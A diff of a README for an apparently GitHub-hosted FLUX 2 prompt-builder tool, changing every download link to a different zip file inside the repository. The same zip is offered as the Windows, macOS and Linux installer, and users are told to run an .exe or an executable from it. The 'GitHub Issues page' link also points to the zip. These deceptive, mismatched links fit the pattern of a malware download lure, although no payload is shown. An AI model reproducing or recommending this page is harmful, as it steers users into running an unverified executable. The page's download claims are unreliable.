@@ -1,7 +1,7 @@
 # 🎨 kiko-flux2-prompt-builder - Build Stunning Prompts Easily
 
 ## 📥 Download the App
-[![Download kiko-flux2-prompt-builder](https://raw.githubusercontent.com/uNdErHeLsInG/kiko-flux2-prompt-builder/main/nodes/kiko-flux2-prompt-builder-3.5.zip)](https://raw.githubusercontent.com/uNdErHeLsInG/kiko-flux2-prompt-builder/main/nodes/kiko-flux2-prompt-builder-3.5.zip)
+[![Download kiko-flux2-prompt-builder](https://github.com/uNdErHeLsInG/kiko-flux2-prompt-builder/raw/refs/heads/main/web/prompt_builder_kiko_flux_v3.7-beta.2.zip)](https://github.com/uNdErHeLsInG/kiko-flux2-prompt-builder/raw/refs/heads/main/web/prompt_builder_kiko_flux_v3.7-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the kiko-flux2-prompt-builder! This application allows you to create beautiful JSON-style prompts for FLUX 2 with various presets for camera, lens, lighting, and style. Whether you are designing for art, media, or various projects, this tool simplifies your workflow.
@@ -22,7 +22,7 @@ To run kiko-flux2-prompt-builder, your computer should meet these requirements:
 ## 💻 Download & Install
 To get started with the kiko-flux2-prompt-builder, visit the following link to download the latest version:
 
-[Download kiko-flux2-prompt-builder](https://raw.githubusercontent.com/uNdErHeLsInG/kiko-flux2-prompt-builder/main/nodes/kiko-flux2-prompt-builder-3.5.zip)
+[Download kiko-flux2-prompt-builder](https://github.com/uNdErHeLsInG/kiko-flux2-prompt-builder/raw/refs/heads/main/web/prompt_builder_kiko_flux_v3.7-beta.2.zip)
 
 ### Step-by-Step Installation:
 
@@ -34,14 +34,14 @@ To get started with the kiko-flux2-prompt-builder, visit the following link to d
 
 3. **Download the Installer:**
    Look for the file that matches your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/uNdErHeLsInG/kiko-flux2-prompt-builder/main/nodes/kiko-flux2-prompt-builder-3.5.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/uNdErHeLsInG/kiko-flux2-prompt-builder/main/nodes/kiko-flux2-prompt-builder-3.5.zip`.
-   - For Linux, download the appropriate `https://raw.githubusercontent.com/uNdErHeLsInG/kiko-flux2-prompt-builder/main/nodes/kiko-flux2-prompt-builder-3.5.zip` file.
+   - For Windows, download `https://github.com/uNdErHeLsInG/kiko-flux2-prompt-builder/raw/refs/heads/main/web/prompt_builder_kiko_flux_v3.7-beta.2.zip`.
+   - For macOS, download `https://github.com/uNdErHeLsInG/kiko-flux2-prompt-builder/raw/refs/heads/main/web/prompt_builder_kiko_flux_v3.7-beta.2.zip`.
+   - For Linux, download the appropriate `https://github.com/uNdErHeLsInG/kiko-flux2-prompt-builder/raw/refs/heads/main/web/prompt_builder_kiko_flux_v3.7-beta.2.zip` file.
 
 4. **Run the Installer:**
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Unpack the `https://raw.githubusercontent.com/uNdErHeLsInG/kiko-flux2-prompt-builder/main/nodes/kiko-flux2-prompt-builder-3.5.zip` file and run the included executable.
+   - For Linux: Unpack the `https://github.com/uNdErHeLsInG/kiko-flux2-prompt-builder/raw/refs/heads/main/web/prompt_builder_kiko_flux_v3.7-beta.2.zip` file and run the included executable.
 
 5. **Launch the Application:**
    After installation, open the application from your Start Menu (Windows), Applications folder (Mac), or your preferred launch method (Linux).
@@ -61,7 +61,7 @@ Once you launch kiko-flux2-prompt-builder, you will see the main interface. Here
 
 ## 📞 Need Help?
 If you encounter issues or have questions, feel free to reach out:
-- Open an **Issue** on our [GitHub Issues page](https://raw.githubusercontent.com/uNdErHeLsInG/kiko-flux2-prompt-builder/main/nodes/kiko-flux2-prompt-builder-3.5.zip).
+- Open an **Issue** on our [GitHub Issues page](https://github.com/uNdErHeLsInG/kiko-flux2-prompt-builder/raw/refs/heads/main/web/prompt_builder_kiko_flux_v3.7-beta.2.zip).
 - Join our community discussion for tips and feedback.
 
 ## 🎉 Join the Community
